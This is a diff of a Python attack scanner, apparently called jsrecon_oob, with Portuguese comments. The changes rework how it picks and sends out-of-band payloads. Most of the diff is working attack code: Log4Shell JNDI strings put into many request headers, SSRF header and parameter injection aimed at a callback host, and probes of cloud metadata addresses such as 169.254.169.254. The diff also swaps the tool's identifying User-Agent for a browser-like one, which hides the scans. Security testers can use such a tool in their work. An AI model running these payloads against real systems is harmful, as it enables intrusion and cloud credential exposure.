         "\r\nX-Injected: https://{ID}.{OOB}/\r\n",
         '{{"version":"1.1","host":"{ID}.{OOB}","short_message":"oob"}}',
-        '{{"event":{{"url":"https://{ID}.{OOB}/"}}}}',
     ],
 }
 
-# ─── Detecção de cloud metadata na resposta HTTP ──────────────────────────────
-# Payloads de metadata (169.254.169.254, etc.) não geram callback OOB —
-# são detectados pelo conteúdo da resposta HTTP.
+# ─── Cloud metadata ───────────────────────────────────────────────────────────
 CLOUD_METADATA_CHECKS: list[tuple[str, str, list[str]]] = [
-    ("AWS",          "http://169.254.169.254/latest/meta-data/",          ["ami-id", "instance-id", "instance-type"]),
+    ("AWS",          "http://169.254.169.254/latest/meta-data/",           ["ami-id", "instance-id", "instance-type"]),
     ("GCP",          "http://metadata.google.internal/computeMetadata/v1/",["computeMetadata", "project-id"]),
-    ("Azure",        "http://169.254.169.254/metadata/instance",           ["compute", "azEnvironment", "subscriptionId"]),
-    ("Alibaba",      "http://100.100.100.200/latest/meta-data/",           ["instance-id", "region-id"]),
-    ("DigitalOcean", "http://169.254.169.254/metadata/v1/",                ["droplet_id", "hostname"]),
+    ("Azure",        "http://169.254.169.254/metadata/instance",            ["compute", "azEnvironment", "subscriptionId"]),
+    ("Alibaba",      "http://100.100.100.200/latest/meta-data/",            ["instance-id", "region-id"]),
+    ("DigitalOcean", "http://169.254.169.254/metadata/v1/",                 ["droplet_id", "hostname"]),
 ]
 
 def check_cloud_metadata(base_url: str, param: str,
-                         lg: logging.Logger,
-                         proxy: str = "") -> Optional[tuple[str, str]]:
-    """
-    Injeta URLs de metadata de cloud como valor do parâmetro e verifica
-    se a resposta contém dados de cloud. Retorna (provider, url) se detectado.
-    """
+                         lg: logging.Logger, proxy: str = "") -> Optional[tuple[str, str]]:
     for provider, meta_url, signatures in CLOUD_METADATA_CHECKS:
         try:
             injected = _inject_param(base_url, param, meta_url)
-            proxies = {"http": proxy, "https": proxy} if proxy else None
-            resp = requests.get(injected, timeout=8, verify=False,
-                                allow_redirects=True, proxies=proxies,
-                                headers={"User-Agent": "Mozilla/5.0 (compatible; jsrecon_oob/1.0)"})
-            body = resp.text
-            if any(sig in body for sig in signatures):
+            proxies  = {"http": proxy, "https": proxy} if proxy else None
+            resp = requests.get(
+                injected, timeout=8, verify=False, allow_redirects=True,
+                proxies=proxies,
+                headers={"User-Agent": REAL_UA},
+            )
+            if any(sig in resp.text for sig in signatures):
                 lg.warning("  🔥 CLOUD METADATA EXPOSED! Provider: %s via %s param: %s",
                            provider, base_url, param)
                 return (provider, meta_url)
@@ -1155,86 +1105,57 @@ def check_cloud_metadata(base_url: str, param: str,
             pass
     return None
 
-# ─── Nomes de parâmetros que sugerem SSRF server-side ────────────────────────
-SSRF_PARAM_NAMES: set[str] = {
-    "imageurl", "image_url", "avatarurl", "avatar_url",
-    "thumbnailurl", "thumbnail", "coverurl", "cover",
-    "photourl", "photo_url", "logourl", "logo_url",
-    "iconurl", "icon_url", "bannerurl", "banner_url",
-    "fileurl", "file_url", "documenturl", "doc_url",
-    "pdfurl", "pdf_url", "attachmenturl", "attachment_url",
-    "downloadurl", "download_url", "uploadurl", "upload_url",
-    "importurl", "import_url", "exporturl", "export_url",
-    "csvurl", "csv_url", "dataurl", "data_url",
-    "feedurl", "feed_url", "rssurl", "rss_url",
-    "sitemapurl", "sitemap_url", "atomurl", "atom_url",
-    "proxyurl", "proxy_url", "fetchurl", "fetch_url",
-    "remoteurl", "remote_url", "externalurl", "external_url",
-    "requesturl", "request_url",
-    "webhookurl", "webhook_url", "callbackurl", "callback_url",
-    "notifyurl", "notify_url", "notificationurl", "notification_url",
-    "ipnurl", "ipn_url", "pingurl", "ping_url",
-    "hookurl", "hook_url", "returnurl", "return_url",
-    "successurl", "success_url", "failureurl", "failure_url",
-    "cancelurl", "cancel_url", "redirecturl", "redirect_url",
-}
+# ─── Headers OOB — extraídos do JS + conjunto fixo SSRF/Log4Shell ─────────────
+#
+# REGRA: injetamos headers em duas camadas:
+#   1. Headers que o JS menciona explicitamente (extraídos por extract_js_headers)
+#      → valor substituído pelo payload OOB
+#   2. Conjunto fixo de headers SSRF/Log4Shell universais
+#      → sempre injetados pois são vetores independentes de framework
+#
+# Não inventamos parâmetros de query/body, mas headers HTTP de infra
+# (X-Forwarded-For, User-Agent para Log4Shell, etc.) são testados
+# universalmente porque o servidor os processa independente do código JS.
 
-# ─── Headers OOB ─────────────────────────────────────────────────────────────
-# FIX: X-Forwarded-For não é duplicado — tinha duas entradas com o mesmo nome
-# (SSRF e Log4Shell), o segundo sobrescrevia o primeiro no dict Python.
-# Agora cada header tem nome único. Log4Shell em X-Forwarded-For é enviado
-# numa requisição separada via OOB_HEADERS_LOG4J.
-OOB_HEADERS: list[tuple[str, str]] = [
-    # ── SSRF / IP spoofing ────────────────────────────────────────────────────
-    ("X-Forwarded-For",              "{ID}.{OOB}"),
-    ("X-Real-IP",                    "{ID}.{OOB}"),
-    ("X-Forwarded-Host",             "{ID}.{OOB}"),
-    ("X-Forwarded-Server",           "{ID}.{OOB}"),
-    ("X-HTTP-Host-Override",         "{ID}.{OOB}"),
-    ("X-Forwarded-Proto",            "https://{ID}.{OOB}/"),
-    ("X-ProxyUser-Ip",               "{ID}.{OOB}"),
-    ("X-Remote-IP",                  "{ID}.{OOB}"),
-    ("X-Remote-Addr",                "{ID}.{OOB}"),
-    ("X-Original-URL",               "https://{ID}.{OOB}/"),
-    ("X-Rewrite-URL",                "https://{ID}.{OOB}/"),
-    ("X-Custom-IP-Authorization",    "{ID}.{OOB}"),
-    ("X-Originating-IP",             "{ID}.{OOB}"),
-    ("True-Client-IP",               "{ID}.{OOB}"),
-    ("CF-Connecting-IP",             "{ID}.{OOB}"),
-    ("X-Host",                       "{ID}.{OOB}"),
-    ("Host",                         "{ID}.{OOB}"),
-    ("Forwarded",                    "for={ID}.{OOB};by={ID}.{OOB}"),
-    ("Via",                          "1.1 {ID}.{OOB}"),
-    ("Proxy",                        "https://{ID}.{OOB}/"),
-    # ── Webhook / Callback ────────────────────────────────────────────────────
-    ("X-Callback-URL",               "https://{ID}.{OOB}/"),
-    ("X-Hook-URL",                   "https://{ID}.{OOB}/"),
-    ("X-Webhook-URL",                "https://{ID}.{OOB}/"),
-    ("X-Notification-URL",           "https://{ID}.{OOB}/"),
-    ("X-Return-URL",                 "https://{ID}.{OOB}/"),
-    ("X-Success-URL",                "https://{ID}.{OOB}/"),
-    ("X-Wap-Profile",                "https://{ID}.{OOB}/"),
-    # ── Referer / Origin ──────────────────────────────────────────────────────
-    ("Referer",                      "https://{ID}.{OOB}/"),
-    ("Origin",                       "https://{ID}.{OOB}"),
-    # ── SMTP OOB via headers de e-mail ────────────────────────────────────────
-    ("Contact",                      "admin@{ID}.{OOB}"),
-    ("From",                         "user@{ID}.{OOB}"),
+OOB_HEADERS_SSRF: list[tuple[str, str]] = [
+    ("X-Forwarded-For",           "{ID}.{OOB}"),
+    ("X-Real-IP",                 "{ID}.{OOB}"),
+    ("X-Forwarded-Host",          "{ID}.{OOB}"),
+    ("X-Forwarded-Server",        "{ID}.{OOB}"),
+    ("X-HTTP-Host-Override",      "{ID}.{OOB}"),
+    ("X-Forwarded-Proto",         "https://{ID}.{OOB}/"),
+    ("X-ProxyUser-Ip",            "{ID}.{OOB}"),
+    ("X-Remote-IP",               "{ID}.{OOB}"),
+    ("X-Remote-Addr",             "{ID}.{OOB}"),
+    ("X-Original-URL",            "https://{ID}.{OOB}/"),
+    ("X-Rewrite-URL",             "https://{ID}.{OOB}/"),
+    ("X-Custom-IP-Authorization", "{ID}.{OOB}"),
+    ("X-Originating-IP",          "{ID}.{OOB}"),
+    ("True-Client-IP",            "{ID}.{OOB}"),
+    ("CF-Connecting-IP",          "{ID}.{OOB}"),
+    ("X-Host",                    "{ID}.{OOB}"),
+    ("Forwarded",                 "for={ID}.{OOB};by={ID}.{OOB}"),
+    ("Via",                       "1.1 {ID}.{OOB}"),
+    ("X-Callback-URL",            "https://{ID}.{OOB}/"),
+    ("X-Hook-URL",                "https://{ID}.{OOB}/"),
+    ("X-Webhook-URL",             "https://{ID}.{OOB}/"),
+    ("X-Wap-Profile",             "https://{ID}.{OOB}/"),
+    ("Referer",                   "https://{ID}.{OOB}/"),
+    ("Origin",                    "https://{ID}.{OOB}"),
+    ("Contact",                   "admin@{ID}.{OOB}"),
+    ("From",                      "user@{ID}.{OOB}"),
 ]
 
-# Log4Shell injetado em headers comuns — em requisição separada para evitar
-# colisão de nome de header (X-Forwarded-For duplicado).
 OOB_HEADERS_LOG4J: list[tuple[str, str]] = [
-    ("User-Agent",        "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
-    ("X-Api-Version",     "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
-    ("X-Forwarded-For",   "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
-    ("Accept-Language",   "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
-    ("Accept",            "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
-    ("DNT",               "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
-    ("X-Arbitrary",       "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
+    ("User-Agent",      "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
+    ("X-Api-Version",   "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
+    ("X-Forwarded-For", "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
+    ("Accept-Language", "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
+    ("Accept",          "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
+    ("DNT",             "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
+    ("X-Arbitrary",     "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
 ]
 
-# ─── Path SSRF pattern ────────────────────────────────────────────────────────
 _PATH_PARAM_SSRF_RE = re.compile(
     r'/(?:fetch|proxy|render|load|get|download|import|export|'
     r'preview|screenshot|pdf|convert|transform|mirror|relay|'
@@ -1243,13 +1164,8 @@ _PATH_PARAM_SSRF_RE = re.compile(
     re.I
 )
 
-# ─── Construção de payload com substituições ──────────────────────────────────
+# ─── Build payload ────────────────────────────────────────────────────────────
 def _build_payload(tpl: str, oob_host: str, uid: str) -> str:
-    """
-    Aplica todas as substituições de template num payload.
-    FIX: inclui {HEX_OOB} — subdomínio DNS completo codificado em hex,
-    necessário para payloads MySQL LOAD_FILE com encoding hexadecimal.
-    """
     subdomain = f"{uid}.{oob_host}"
     hex_oob   = subdomain.encode().hex()
     return (tpl
@@ -1257,86 +1173,84 @@ def _build_payload(tpl: str, oob_host: str, uid: str) -> str:
             .replace("{ID}",      uid)
             .replace("{HEX_OOB}", hex_oob))
 
-# ─── Seleção de payloads por contexto ────────────────────────────────────────
-def _choose_payloads(method: str, param_name: str, query_params: str,
-                     base_url: str = "", label: str = "") -> list[tuple[str, str]]:
-    chosen = []
-    pm     = param_name.lower()
+# ─── Seleção de payloads por TIPO de endpoint — sem heurística de nome ────────
+#
+# MUDANÇA CENTRAL: payloads são escolhidos pelo TIPO DO ENDPOINT,
+# não pelo nome do parâmetro. O nome do param só é usado para
+# determinar se é campo de e-mail (SMTP) ou se é um path param REST.
+# Nenhum parâmetro é inventado — só injeta nos que existem no JS.
+#
+def _choose_payloads_for_param(
+    method: str,
+    param_name: str,
+    is_query_param: bool,
+    is_body_param: bool,
+    is_path_param: bool,
+    endpoint_label: str,
+    base_url: str,
+) -> list[tuple[str, str]]:
+    """
+    Escolhe payloads com base no TIPO do endpoint e do parâmetro.
+    Não faz inferência por nome — só pelo contexto estrutural.
+    """
+    chosen: list[tuple[str, str]] = []
+    pm = param_name.lower()
 
-    is_ssrf_param = (
-        pm in SSRF_PARAM_NAMES
-        or any(k in pm for k in ("url", "uri", "endpoint", "host", "callback",
-                                  "redirect", "next", "return", "dest", "target",
-                                  "link", "src", "source", "domain", "addr",
-                                  "address", "fetch", "proxy", "remote", "import",
-                                  "export", "feed", "rss", "webhook", "hook",
-                                  "notify", "ipn", "ping", "image", "avatar",
-                                  "thumbnail", "cover", "file", "doc", "pdf"))
-    )
-    if is_ssrf_param:
-        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
-        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"][:6]]
-        chosen += [("redirect",    p) for p in OOB_PAYLOADS["redirect"]]
-        chosen += [("upload_ssrf", p) for p in OOB_PAYLOADS["upload_ssrf"]]
-
-    # ── Parâmetro sugere SQLi ─────────────────────────────────────────────
-    if any(k in pm for k in ("id", "user", "name", "search", "query", "q",
-                               "filter", "order", "sort", "where", "key",
-                               "email", "login", "pass", "username", "userid",
-                               "item", "product", "category", "tag")):
-        chosen += [("sqli", p) for p in OOB_PAYLOADS["sqli"]]
-
-    # ── Parâmetro sugere XSS ──────────────────────────────────────────────
-    if any(k in pm for k in ("q", "search", "s", "query", "input", "text",
-                               "msg", "message", "content", "body", "comment",
-                               "title", "name", "value", "data", "html",
-                               "description", "note", "label", "subject")):
-        chosen += [("xss", p) for p in OOB_PAYLOADS["xss"]]
-
-    # ── Parâmetro sugere SSTI ─────────────────────────────────────────────
-    if any(k in pm for k in ("template", "theme", "view", "layout", "page",
-                               "render", "format", "tpl", "tmpl", "engine")):
-        chosen += [("ssti", p) for p in OOB_PAYLOADS["ssti"][:4]]
-
-    # ── Parâmetro sugere SMTP OOB ─────────────────────────────────────────
-    if any(k in pm for k in ("email", "mail", "to", "from", "cc", "bcc",
-                               "recipient", "contact", "notify", "sender")):
+    # ── Parâmetro de e-mail → SMTP OOB ────────────────────────────────────
+    # Única heurística de nome mantida: campos email/mail são SMTP por natureza
+    if any(k in pm for k in ("email", "mail")):
         chosen += [("smtp", p) for p in OOB_PAYLOADS["smtp"]]
+        return _dedup(chosen)
 
-    # ── URL base sugere endpoint de proxy/fetch ───────────────────────────
-    if base_url and _PATH_PARAM_SSRF_RE.search(base_url):
+    # ── Path param REST (:id, {resource}) → SSRF no path ──────────────────
+    if is_path_param:
         chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
         chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"][:4]]
+        return _dedup(chosen)
+
+    # ── Endpoint de proxy/fetch/render → SSRF forte ────────────────────────
+    if _PATH_PARAM_SSRF_RE.search(base_url):
+        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
+        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"]]
         chosen += [("upload_ssrf", p) for p in OOB_PAYLOADS["upload_ssrf"]]
+        chosen += [("xxe",         p) for p in OOB_PAYLOADS["xxe"]]
+        return _dedup(chosen)
 
-    # ── POST/PUT/PATCH recebe SSRF + Log4Shell ────────────────────────────
-    if method in ("POST", "PUT", "PATCH"):
-        chosen += [("ssrf",      p) for p in OOB_PAYLOADS["ssrf"]]
-        chosen += [("log4shell", p) for p in OOB_PAYLOADS["log4shell"][:3]]
-
-    # ── GraphQL — payload estruturado ─────────────────────────────────────
-    if label in ("graphql", "graphql_url") or "graphql" in base_url.lower():
+    # ── GraphQL → payload estruturado ──────────────────────────────────────
+    if endpoint_label in ("graphql", "graphql_url") or "graphql" in base_url.lower():
         chosen += [("graphql", p) for p in OOB_PAYLOADS["graphql"]]
+        return _dedup(chosen)
 
-    # ── Fallback ──────────────────────────────────────────────────────────
-    if not chosen:
-        chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"][:2]]
-        chosen += [("xss",  p) for p in OOB_PAYLOADS["xss"][:1]]
+    # ── POST/PUT/PATCH body param → SSRF + XXE ─────────────────────────────
+    if is_body_param and method in ("POST", "PUT", "PATCH"):
+        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
+        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"][:3]]
+        chosen += [("xxe",         p) for p in OOB_PAYLOADS["xxe"]]
+        chosen += [("log4shell",   p) for p in OOB_PAYLOADS["log4shell"][:3]]
+        return _dedup(chosen)
 
-    # ── Log4Shell em todos ────────────────────────────────────────────────
-    chosen += [("log4shell", p) for p in OOB_PAYLOADS["log4shell"][:3]]
+    # ── Query param GET → SSRF + XSS ──────────────────────────────────────
+    if is_query_param and method == "GET":
+        chosen += [("ssrf",   p) for p in OOB_PAYLOADS["ssrf"]]
+        chosen += [("xss",    p) for p in OOB_PAYLOADS["xss"]]
+        chosen += [("redirect", p) for p in OOB_PAYLOADS["redirect"]]
+        return _dedup(chosen)
 
-    # Dedup mantendo ordem
-    seen_tpls: set[str] = set()
-    deduped = []
-    for cat, tpl in chosen:
-        if tpl not in seen_tpls:
-            seen_tpls.add(tpl)
-            deduped.append((cat, tpl))
+    # ── Fallback conservador — SSRF básico ────────────────────────────────
+    chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"][:2]]
+    return _dedup(chosen)
 
-    return deduped
 
-# ─── Injeção HTTP ─────────────────────────────────────────────────────────────
+def _dedup(lst: list[tuple[str, str]]) -> list[tuple[str, str]]:
+    seen: set[str] = set()
+    out  = []
+    for cat, tpl in lst:
+        if tpl not in seen:
+            seen.add(tpl)
+            out.append((cat, tpl))
+    return out
+
+# ─── Injeção HTTP ──────────────────────────────────────────────────────────────
 def _inject_param(url: str, param: str, value: str) -> str:
     try:
         parsed = urllib.parse.urlparse(url)
@@ -1350,13 +1264,11 @@ def _inject_param(url: str, param: str, value: str) -> str:
 def _send_request(url: str, method: str, headers: dict,
                   body=None, timeout: int = 8,
                   proxy: str = "") -> str:
-    """
-    FIX: proxy agora é passado explicitamente — antes era ignorado
-    mesmo quando --proxy estava configurado.
-    """
     try:
         fn      = getattr(requests, method.lower(), requests.get)
         proxies = {"http": proxy, "https": proxy} if proxy else None
+        # Garante que REAL_UA está presente em todas as requests
+        headers.setdefault("User-Agent", REAL_UA)
         kwargs: dict = {
             "headers":         headers,
             "timeout":         timeout,
@@ -1386,132 +1298,149 @@ def inject_endpoint(ep: dict, oob_host: str, plog: PayloadLog,
     label    = ep.get("label", "")
     sent     = 0
 
-    # ── Inferência de método HTTP ─────────────────────────────────────────
-    # FIX: usa _GET_LABELS/_POST_LABELS antes de qualquer heurística de path,
-    # evitando que router_path/href_action caiam em POST desnecessariamente.
+    # ── Inferência de método HTTP ──────────────────────────────────────────
     if method in ("GET", "POST", "PUT", "PATCH", "DELETE", "WS"):
         req_method = method
     else:
         has_body = bool(ep.get("body_params"))
-        has_qs   = "?" in base_url
-
         if label in _GET_LABELS and not has_body:
             req_method = "GET"
         elif label in _POST_LABELS or has_body:
             req_method = "POST"
-        elif has_qs:
-            req_method = "GET"
         else:
-            req_method = "GET"   # FIX: conservador (antes era POST)
+            req_method = "GET"
 
-    # WebSocket — injeção especial
     if req_method == "WS":
         sent += _inject_websocket(ep, oob_host, plog, lg)
         return sent
 
-    method_display = (req_method if method in ("GET","POST","PUT","PATCH","DELETE")
-                      else f"{req_method}(≈{method})")
+    method_display = req_method
 
-    # ── 1. Query params + body params + path params ───────────────────────
+    # ── Coleta params EXCLUSIVAMENTE do JS ───────────────────────────────
+    # REGRA: zero parâmetros inventados.
+    # Só injeta em params que existem em uma destas fontes:
+    #   a) query string literal extraída do JS
+    #   b) body params extraídos do contexto JSON.stringify no JS
+    #   c) path params REST (:id, {id}) extraídos do path
+    #
     params_from_qs   = []
-    params_from_path = extract_path_params(base_url)  # FIX: extrai :id, {id}
+    params_from_body = ep.get("body_params", [])
+    params_from_path = extract_path_params(base_url)
 
     if "?" in base_url:
         qs = urllib.parse.urlparse(base_url).query
-        params_from_qs = list(urllib.parse.parse_qs(qs, keep_blank_values=True).keys())
+        params_from_qs = list(urllib.parse.parse_qs(
+            qs.replace("__OOB__", "placeholder"),
+            keep_blank_values=True
+        ).keys())
 
-    body_params = ep.get("body_params", [])
-    all_params  = list(dict.fromkeys(
-        params_from_qs + body_params + params_from_path
-    )) or ["q"]
+    # Se não há nenhum param em nenhuma fonte → não injeta nada neste endpoint
+    # (apenas headers OOB ainda são testados, pois são camada de infra)
+    has_any_param = bool(params_from_qs or params_from_body or params_from_path)
 
-    for param in all_params:
-        is_path_param = param in params_from_path and param not in params_from_qs
-        payloads = _choose_payloads(req_method, param,
-                                    ep.get("query_params", ""), base_url, label)
+    if has_any_param:
+        # Dedup mantendo ordem de prioridade: qs > body > path
+        all_params = list(dict.fromkeys(
+            params_from_qs + params_from_body + params_from_path
+        ))
 
-        for category, tpl in payloads:
-            uid     = unique_id(category, param)
-            payload = _build_payload(tpl, oob_host, uid)
-            sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")
+        for param in all_params:
+            is_qs   = param in params_from_qs
+            is_body = param in params_from_body
+            is_path = param in params_from_path
 
-            # GraphQL — body é a query completa, não um campo
-            if category == "graphql":
-                injected_url = base_url
-                body_data    = payload   # string JSON
-            elif is_path_param:
-                # FIX: injeta no path REST em vez de query string
-                injected_url = inject_path_param(base_url, param, payload)
-                body_data    = None
-            elif req_method == "GET" or param in params_from_qs:
-                injected_url = _inject_param(base_url, param, payload)
-                body_data    = None
-            else:
-                injected_url = base_url
-                body_data    = {
-                    p: (payload if p == param else f"<{p}>")
-                    for p in (body_params or [param])
+            payloads = _choose_payloads_for_param(
+                req_method, param, is_qs, is_body, is_path, label, base_url
+            )
+
+            for category, tpl in payloads:
+                uid     = unique_id(category, param)
+                payload = _build_payload(tpl, oob_host, uid)
+                sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")
+
+                if category == "graphql":
+                    injected_url = base_url
+                    body_data    = payload
+                elif is_path:
+                    injected_url = inject_path_param(base_url, param, payload)
+                    body_data    = None
+                elif req_method == "GET" or is_qs:
+                    injected_url = _inject_param(base_url, param, payload)
+                    body_data    = None
+                else:
+                    injected_url = base_url
+                    body_data    = {
+                        p: (payload if p == param else f"<{p}>")
+                        for p in (params_from_body or [param])
+                    }
+
+                headers = {
+                    "User-Agent": REAL_UA,
+                    "Accept":     "application/json, */*",
                 }
 
-            headers = {
-                "User-Agent": "Mozilla/5.0 (compatible; jsrecon_oob/1.0)",
-                "Accept":     "application/json, */*",
-            }
+                # Inclui headers do JS se existirem (ex: Content-Type: application/json)
+                if ep.get("js_headers"):
+                    for hk, hv in ep["js_headers"].items():
+                        if hk.lower() not in ("user-agent",):
+                            headers.setdefault(hk, hv)
 
-            plog.record(uid, base_url, param, category, payload)
-            _rate_limiter.acquire()
-            code = _send_request(injected_url, req_method, headers, body_data,
-                                 proxy=proxy)
+                plog.record(uid, base_url, param, category, payload)
+                _rate_limiter.acquire()
+                code = _send_request(injected_url, req_method, headers, body_data,
+                                     proxy=proxy)
 
-            clog(lg,
-                 f"  {sent_at} [{uid[:30]}] "
-                 f"{param:15} {category:12} "
-                 f"[{method_display}] HTTP {code} → {base_url[:45]}",
-                 C.GREEN if code in ("200","201","301","302") else C.DIM)
-            sent += 1
+                clog(lg,
+                     f"  {sent_at} [{uid[:28]}] "
+                     f"{param:15} {category:12} "
+                     f"[{method_display}] HTTP {code} → {base_url[:45]}",
+                     C.GREEN if code in ("200","201","301","302") else C.DIM)
+                sent += 1
 
-    # ── 2. Detecção de cloud metadata (por resposta HTTP) ─────────────────
-    # Roda apenas em parâmetros que sugerem SSRF — evita flood
-    ssrf_params = [p for p in all_params
-                   if any(k in p.lower() for k in ("url", "uri", "src", "dest",
-                                                     "redirect", "target", "host",
-                                                     "callback", "fetch", "proxy"))]
-    for param in ssrf_params[:2]:  # max 2 params por endpoint
-        check_cloud_metadata(base_url, param, lg, proxy)
+        # Cloud metadata — só em params de URL/body que o JS expôs
+        ssrf_params = [p for p in (params_from_qs + params_from_body)
+                       if any(k in p.lower() for k in
+                              ("url", "uri", "src", "dest", "redirect",
+                               "target", "host", "callback", "fetch",
+                               "proxy", "domain", "subdomain"))]
+        for param in ssrf_params[:2]:
+            check_cloud_metadata(base_url, param, lg, proxy)
+    else:
+        clog(lg,
+             f"  [SKIP params] {base_url[:60]} — nenhum param extraído do JS",
+             C.DIM)
 
-    # ── 3. Headers OOB (SSRF) ─────────────────────────────────────────────
-    for hdr_name, hdr_tpl in OOB_HEADERS:
+    # ── Headers OOB SSRF — camada de infraestrutura ────────────────────────
+    # Headers são injetados mesmo sem params de query/body porque
+    # o servidor HTTP os processa independente do código da aplicação.
+    for hdr_name, hdr_tpl in OOB_HEADERS_SSRF:
         uid      = unique_id("hdr", re.sub(r'[^a-z0-9]', '', hdr_name.lower())[:6])
         payload  = _build_payload(hdr_tpl, oob_host, uid)
         sent_at  = datetime.now(timezone.utc).strftime("%H:%M:%S")
-        category = "header_ssrf"
 
         headers = {
-            "User-Agent": "Mozilla/5.0 (compatible; jsrecon_oob/1.0)",
+            "User-Agent": REAL_UA,
             "Accept":     "application/json, */*",
             hdr_name:     payload,
         }
 
         hdr_body = ({"_": ""} if req_method in ("POST", "PUT", "PATCH")
-                    and body_params else None)
+                    and params_from_body else None)
 
-        plog.record(uid, base_url, hdr_name, category, payload)
+        plog.record(uid, base_url, hdr_name, "header_ssrf", payload)
         _rate_limiter.acquire()
         code = _send_request(base_url, req_method, headers, hdr_body, proxy=proxy)
 
         clog(lg,
-             f"  {sent_at} [{uid[:30]}] "
+             f"  {sent_at} [{uid[:28]}] "
              f"{hdr_name:25} header_ssrf  "
              f"[{method_display}] HTTP {code} → {base_url[:30]}",
              C.DIM)
         sent += 1
 
-    # ── 4. Headers Log4Shell — requisição separada ────────────────────────
-    # FIX: antes X-Forwarded-For aparecia duas vezes (SSRF + Log4Shell)
-    # no mesmo dict de headers — o segundo sobrescrevia o primeiro.
-    # Agora são duas requisições distintas.
+    # ── Headers Log4Shell — requisição separada ────────────────────────────
     log4j_headers: dict[str, str] = {
-        "User-Agent": "Mozilla/5.0 (compatible; jsrecon_oob/1.0)",
+        "User-Agent": REAL_UA,
         "Accept":     "application/json, */*",
     }
     for hdr_name, hdr_tpl in OOB_HEADERS_LOG4J:
@@ -1533,38 +1462,32 @@ def inject_endpoint(ep: dict, oob_host: str, plog: PayloadLog,
 
 def _inject_websocket(ep: dict, oob_host: str,
                       plog: PayloadLog, lg: logging.Logger) -> int:
-    """
-    Injeção OOB em endpoints WebSocket.
-    Usa websocket-client se disponível, senão loga aviso.
-    """
-    sent = 0
+    sent   = 0
     ws_url = ep["absolute_url"]
-
     try:
         import websocket as ws_lib
     except ImportError:
         clog(lg, f"  [WS] websocket-client não instalado — pulando {ws_url}", C.YELLOW)
-        clog(lg, "  pip install websocket-client", C.DIM)
         return 0
 
     for tpl in OOB_PAYLOADS["websocket"]:
         uid     = unique_id("ws", "msg")
         payload = _build_payload(tpl, oob_host, uid)
         sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")
-
         try:
             wsapp = ws_lib.WebSocket()
-            wsapp.connect(ws_url, timeout=8)
+            wsapp.connect(ws_url, timeout=8,
+                          header={"User-Agent": REAL_UA})
             wsapp.send(payload)
             wsapp.close()
             code = "WS-OK"
         except Exception as e:
-            code = f"WS-ERR"
+            code = "WS-ERR"
             lg.debug("  [WS] %s: %s", ws_url, e)
 
         plog.record(uid, ws_url, "ws_message", "websocket", payload)
         clog(lg,
-             f"  {sent_at} [{uid[:30]}] ws_message     websocket    "
+             f"  {sent_at} [{uid[:28]}] ws_message     websocket    "
              f"[WS] {code} → {ws_url[:45]}",
              C.DIM)
         _rate_limiter.acquire()
@@ -1582,20 +1505,17 @@ def phase_inject(endpoints: list[dict], oob_host: str, out: Path,
     clog(lg,
          f"  Endpoints para injeção : {len(safe_eps)} "
          f"({len(endpoints)-len(safe_eps)} DELETE descartados)", C.CYAN)
-    clog(lg,
-         f"  Rate limit global      : 1 req / {_rate_limiter.delay}s", C.DIM)
+    clog(lg, f"  Rate limit global      : 1 req / {_rate_limiter.delay}s", C.DIM)
+    clog(lg, f"  User-Agent             : {REAL_UA[:60]}...", C.DIM)
 
     total  = 0
     errors = 0
 
-    def worker(ep):
-        return inject_endpoint(ep, oob_host, plog, lg, proxy)
-
     with ThreadPoolExecutor(max_workers=threads) as ex:
-        futs = {ex.submit(worker, ep): ep for ep in safe_eps}
+        futs = {ex.submit(inject_endpoint, ep, oob_host, plog, lg, proxy): ep
+                for ep in safe_eps}
         for fut in as_completed(futs):
             try:
-                # FIX: timeout por future — evita thread presa indefinidamente
                 total += fut.result(timeout=60)
             except TimeoutError:
                 errors += 1
@@ -1604,8 +1524,7 @@ def phase_inject(endpoints: list[dict], oob_host: str, out: Path,
                 errors += 1
                 lg.error("Inject worker error: %s", e)
 
-    clog(lg, f"\n  Payloads enviados: {total} | Erros: {errors}",
-         C.GREEN + C.BOLD)
+    clog(lg, f"\n  Payloads enviados: {total} | Erros: {errors}", C.GREEN + C.BOLD)
     return total
 
 # ─── Monitor interactsh ───────────────────────────────────────────────────────
@@ -1643,14 +1562,9 @@ def _process_hit(data: dict, plog: PayloadLog,
         if first:
             clog(lg, f"  Request    : {first[:120]}", C.YELLOW)
 
-    # FIX: correlação em dois passos.
-    # 1. full-id DNS — UID está no subdomínio (caso normal).
-    # 2. raw_request — fallback para hits HTTP onde o UID chega no path/body.
     matched = plog.find_fuzzy(raw_id)
     if not matched and raw_request:
         matched = plog.find_fuzzy_in_request(raw_request)
-        if matched:
-            lg.debug("  (correlação via raw_request)")
 
     delay_str = "?"
     if matched:
@@ -1832,7 +1746,7 @@ def _write_summary(hits: list, plog: PayloadLog,
                 f"    Payload    : {m.get('payload','?')}",
             ]
     else:
-        lines.append("  Nenhum hit registrado. Dica: use --monitor-time maior para blind DNS.")
+        lines.append("  Nenhum hit registrado. Dica: use --monitor-time maior.")
 
     summary_file.write_text("\n".join(lines), encoding="utf-8")
